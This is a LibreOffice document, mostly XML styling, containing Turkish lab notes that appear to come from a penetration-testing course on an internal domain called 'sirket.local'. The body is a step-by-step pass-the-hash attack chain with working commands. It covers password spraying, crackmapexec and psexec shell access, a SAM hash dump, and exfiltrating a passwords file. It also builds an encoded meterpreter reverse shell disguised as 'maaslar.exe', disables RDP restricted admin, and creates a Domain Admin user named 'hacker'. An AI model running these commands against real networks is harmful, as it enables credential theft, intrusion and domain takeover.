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c490a" officeooo:paragraph-rsid="0024f1ad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23bda4" officeooo:paragraph-rsid="0023bda4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33ce43" officeooo:paragraph-rsid="0033ce43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346ccf" officeooo:paragraph-rsid="00346ccf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36efb4" officeooo:paragraph-rsid="0036efb4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382a4b" officeooo:paragraph-rsid="00382a4b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392688" officeooo:paragraph-rsid="00392688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3a78a6" officeooo:paragraph-rsid="003a78a6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3b59bc" officeooo:paragraph-rsid="003b59bc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127622" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="001c490a" officeooo:paragraph-rsid="001c490a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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0031dd25" officeooo:paragraph-rsid="0031dd25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fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003945de" officeooo:paragraph-rsid="003945de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fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003d1193" officeooo:paragraph-rsid="003d1193" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00382a4b" officeooo:paragraph-rsid="00382a4b" fo:background-color="#ffff00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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00337d46" officeooo:paragraph-rsid="00337d46" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0033ce43" officeooo:paragraph-rsid="0033ce43" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003b59bc" officeooo:paragraph-rsid="003b59bc" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003f0fc8" officeooo:paragraph-rsid="003f0fc8" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001c490a" officeooo:paragraph-rsid="0024f1ad" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P23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24" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0040b90c" officeooo:paragraph-rsid="0040b90c" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0042aba4" officeooo:paragraph-rsid="0042aba4" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0042ff7e" officeooo:paragraph-rsid="0042ff7e" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="004333ae" officeooo:paragraph-rsid="004333ae" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P28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29" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0044f5d4" officeooo:paragraph-rsid="0044f5d4" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0045a50f" officeooo:paragraph-rsid="0045a50f" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003d1193" officeooo:paragraph-rsid="0040b90c" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003d1193" officeooo:paragraph-rsid="0042aba4" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003d1193" officeooo:paragraph-rsid="0042ff7e" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003d1193" officeooo:paragraph-rsid="004333ae" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003d1193" officeooo:paragraph-rsid="0045a50f" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0031dd25"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="003b59bc"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="003f0fc8"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="0040b90c"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="0042aba4"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="0042ff7e"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="004333ae"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="0045a5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2</text:span>.<text:span text:style-name="T1">PASS THE HASH SALDIRILARI-LATERAL MOVEMENT</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P14">Şifre Püskürtme (Password Spraying) Saldırısı</text:p>
      <text:p text:style-name="P18">Elimizdeki şifreleri, networkte kullanan var mı?</text:p>
      <text:p text:style-name="P6">BILGIISLEM-PC de Computer Management, Local Users, Users altında yeni user oluşturduk, isimleri Admin ve Test, Şifreleri P@ssw0rd!1</text:p>
      <text:p text:style-name="P6">Admini, Administrators group a üye yaptık.</text:p>
      <text:p text:style-name="P6">Aynısını YAZILIM-PC için de yaptık.</text:p>
      <text:p text:style-name="P7">Desktop Users(text) oluşturduk. Içine muhtemel username yazdık.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P8">Set rhosts 10.10.10.0/24</text:p>
      <text:p text:style-name="P8">set smbpass <text:a xlink:type="simple" xlink:href="mailto:P@ssw0rd" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">P@ssw0rd</text:a>!1</text:p>
      <text:p text:style-name="P8">set user_file /root/Desktop/users</text:p>
      <text:p text:style-name="P8">set threads 5</text:p>
      <text:p text:style-name="P8">run</text:p>
      <text:p text:style-name="P9">20,25,35 te şifreyi kullanan userları bulduk.</text:p>
      <text:p text:style-name="P17">SINAV</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P15">Tüm Network e Pass-The-HASH (PSH) Saldırısı</text:p>
      <text:p text:style-name="P11">Şifreye ait kırılmamış hash kullanılabilir mi ?</text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T3">NTLM-</text:span>hashes dan master ın hash ini aldık.</text:p>
      <text:p text:style-name="P12">Msfconsole use auxiliary/scanner/smb/smb_login</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12">set rhosts 10.10.10.0/24</text:p>
      <text:p text:style-name="P12">set smbuser master</text:p>
      <text:p text:style-name="P12">set smbpass aad3b435b51404eeaad3b435b51404ee:020ef8301cb9342dae4624ae63d0ca7b</text:p>
      <text:p text:style-name="P12">set threads 8 <text:s/>run..</text:p>
      <text:p text:style-name="P12">25ve35 te success ama 20 de fail.</text:p>
      <text:p text:style-name="P12">Farklı bir ayarla deneyeceğiz.</text:p>
      <text:p text:style-name="P12">set user_file /root/Desktop/users</text:p>
      <text:p text:style-name="P3">unset SMBuser <text:s/><text:span text:style-name="T2">run..</text:span></text:p>
      <text:p text:style-name="P12">20,25,35 success..</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P21">crackmapexec smb 10.10.10.0/24 -d . -u /root/Desktop/users </text:p>
      <text:p text:style-name="P21">-H :020ef8301cb9342dae4624ae63d0ca7b –shares</text:p>
      <text:p text:style-name="P21">bunu tek tek iplere de odaklayabilirdik.</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P21">crackmapexec smb 10.10.10.0/24 -d . -u /root/Desktop/users -H :020ef8301cb9342dae4624ae63d0ca7b --shares --spider Development --pattern txt</text:p>
      <text:p text:style-name="P21">pattern I log olarak da değişebiliriz.</text:p>
      <text:p text:style-name="P21">Hangi kullanıcı var ve hangi yetkiyle girebiliriz..</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P12">psexec.py 'sirket.local/a.bilgi@10.10.10.20' -hashes aad3b435b51404eeaad3b435b51404ee:050a954393cdbf4ffdd11bfb496fa004</text:p>
      <text:p text:style-name="P12">shell aldık.</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P16">PTH Saldırısı ile Hash Dump</text:p>
      <text:p text:style-name="P3">crackmapexec smb 10.10.10.35 -d sirket.local -u f.yoneten -H 2b07f7b579bb97532a9eb37753765d8f --sam</text:p>
      <text:p text:style-name="P24">sam HASH lerini aldık.</text:p>
      <text:p text:style-name="P24">Üyelik bilgilerini değiştirebiliriz, sam ile ntds değişebilir.</text:p>
      <text:p text:style-name="P24">crackmapexec smb 10.10.10.20 -d sirket.local -u a.bilgi -H 050a954393cdbf4ffdd11bfb496fa004 -M wdigest -o action=enable</text:p>
      <text:p text:style-name="P24">cache yarattık..</text:p>
      <text:p text:style-name="P31"><text:soft-page-break/>PTH Saldırısı ile <text:span text:style-name="T4">Paylaşım ve Kullanıcı Yetkisi Tespiti</text:span></text:p>
      <text:p text:style-name="P3">smbmap -u master -d workgroup -p aad3b435b51404eeaad3b435b51404ee:020ef8301cb9342dae4624ae63d0ca7b -H 10.10.10.35</text:p>
      <text:p text:style-name="P3">smbmap -u administrator -d workgroup -p aad3b435b51404eeaad3b435b51404ee:020ef8301cb9342dae4624ae63d0ca7b -H 10.10.10.20 -q</text:p>
      <text:p text:style-name="P3">smbmap -u a.bilgi -d sirket.local -p aad3b435b51404eeaad3b435b51404ee:050a954393cdbf4ffdd11bfb496fa004 -H 10.10.10.20 -q</text:p>
      <text:p text:style-name="P25">sonunu -x ipconfig/all veya whoami/all olarak değişebiliriz.</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P32">PTH Saldırısı ile <text:span text:style-name="T5">Dosya Download ve Upload</text:span></text:p>
      <text:p text:style-name="P2">smbmap -u master -d workgroup -p aad3b435b51404eeaad3b435b51404ee:020ef8301cb9342dae4624ae63d0ca7b -H 10.10.10.35 -r Development</text:p>
      <text:p text:style-name="P26">Ortak dosyayı gördük, eğer sonuna -A txt ekleseydik sadece o uzantılı dosyaları görürdük.</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26">smbmap -u master -d workgroup -p aad3b435b51404eeaad3b435b51404ee:020ef8301cb9342dae4624ae63d0ca7b -H 10.10.10.35 --download 'Development\sifreler.txt'</text:p>
      <text:p text:style-name="P26">smbmap -u master -d workgroup -p aad3b435b51404eeaad3b435b51404ee:020ef8301cb9342dae4624ae63d0ca7b -H 10.10.10.35 --upload '/root/Desktop/test' 'Development/selam.txt'</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P33">PTH Saldırısı ile <text:span text:style-name="T6">Dosya Çalıştırma</text:span></text:p>
      <text:p text:style-name="P2">crackmapexec smb 10.10.10.35 -d sirket.local -u f.yoneten -H aad3b435b51404eeaad3b435b51404ee:2b07f7b579bb97532a9eb37753765d8f --exec-method smbexec -x 'c:\development\selam.txt'</text:p>
      <text:p text:style-name="P27">burada, -x ten sonra yazacağımız komutlar, cmd de çalışacak..</text:p>
      <text:p text:style-name="P27">msfvenomdan, payload oluşturup karşıya atacağız.</text:p>
      <text:p text:style-name="P27">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.80 lport=4444 -e x86/shikata_ga_nai -f exe &gt; rev-shell-encoded.exe</text:p>
      <text:p text:style-name="P27">-f den önce -i 3 yaparak dosyayı 3 kez oluşturabiliriz.</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">Msfvenom -l encoders (basit encoderları görürüz.)</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">smbmap -u master -d workgroup -p aad3b435b51404eeaad3b435b51404ee:020ef8301cb9342dae4624ae63d0ca7b -H 10.10.10.35 --upload '/root/rev-shell-encoded.exe' 'Development\maaslar.exe'</text:p>
      <text:p text:style-name="P27">payloadımız karşıda..</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P34"><text:span text:style-name="T7">PT</text:span>H Saldırısı ile <text:span text:style-name="T7">RDP Kullanımı</text:span></text:p>
      <text:p text:style-name="P4">xfreerdp -d sirket.local -u a.bilgi -pth 050a954393cdbf4ffdd11bfb496fa004 -v 10.10.10.20</text:p>
      <text:p text:style-name="P29">Karşıya girmeye çalışınca RDP uyarısı aldık.</text:p>
      <text:p text:style-name="P29">Karşıda, registry den bunu kapatmamız lazım.</text:p>
      <text:p text:style-name="P29">Cmd de registry rule değiştirmek için giriyoruz.</text:p>
      <text:p text:style-name="P29">crackmapexec smb 10.10.10.20 -d sirket.local -u a.bilgi -H 050a954393cdbf4ffdd11bfb496fa004 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa -t REG_DWORD -v DisableRestrictedAdmin -d 0x0 -f'</text:p>
      <text:p text:style-name="P30">değiştirdik ve yeniden deniyoruz. İçerdeyiz..</text:p>
      <text:p text:style-name="P35"><text:soft-page-break/><text:span text:style-name="T7">PT</text:span>H Saldırısı ile <text:span text:style-name="T8">Domain i Ele Geçirme</text:span></text:p>
      <text:p text:style-name="P30">Domain olacak başka bir user oluşturmaya çalışacağız.</text:p>
      <text:p text:style-name="P30">crackmapexec smb 10.10.10.20 -d sirket.local -u a.bilgi -H 050a954393cdbf4ffdd11bfb496fa004 exec-method -x 'net user hacker H4CK3R-1 /add /domain'</text:p>
      <text:p text:style-name="P30">Şimdi Domain Admin yapıp yetkilerini yükselteceğiz.</text:p>
      <text:p text:style-name="P30">crackmapexec smb 10.10.10.20 -d sirket.local -u a.bilgi -H 050a954393cdbf4ffdd11bfb496fa004 exec-method -x 'net group "domain admins" hacker /add /domain'</text:p>
      <text:p text:style-name="P30">ek olarak RDP grubuna eklenip, uzaktan erişilebilir..</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/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9T22:37:40.380184414</dc:date>
    <meta:editing-duration>PT9H33M44S</meta:editing-duration>
    <meta:editing-cycles>39</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="73" meta:word-count="515" meta:character-count="4636" meta:non-whitespace-character-count="4199"/>
  </office:meta>
</office:document-meta>
</file>